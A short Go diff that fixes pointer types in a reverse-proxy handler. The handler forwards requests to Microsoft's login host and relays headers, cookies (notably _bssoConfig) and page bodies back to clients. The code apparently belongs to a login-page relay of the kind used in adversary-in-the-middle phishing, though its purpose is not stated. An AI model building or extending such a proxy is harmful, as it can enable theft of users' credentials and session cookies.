@@ -61,7 +61,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     }
 
     // Copy headers, ensuring _bssoConfig cookie is unaltered
-    copyHeadersWithCookies(r.Header, &req.Header)
+    copyHeadersWithCookies(r.Header, req.Header)
 
     req.Header.Set("Host", "login.microsoftonline.com")
     req.Header.Set("Referer", r.Referer())
@@ -78,14 +78,14 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     bodyString := string(body)
 
     // Ensure _bssoConfig cookie remains unaltered in response
-    copyHeadersWithCookies(resp.Header, &w.Header())
+    copyHeadersWithCookies(resp.Header, w.Header())
 
     w.WriteHeader(resp.StatusCode)
     w.Write([]byte(bodyString))
 }
 
 // copyHeadersWithCookies ensures that the _bssoConfig cookie is copied without alteration
-func copyHeadersWithCookies(src http.Header, dst *http.Header) {
+func copyHeadersWithCookies(src http.Header, dst http.Header) {
     for k, v := range src {
         for _, vv := range v {
             // Pass through the _bssoConfig cookie unaltered
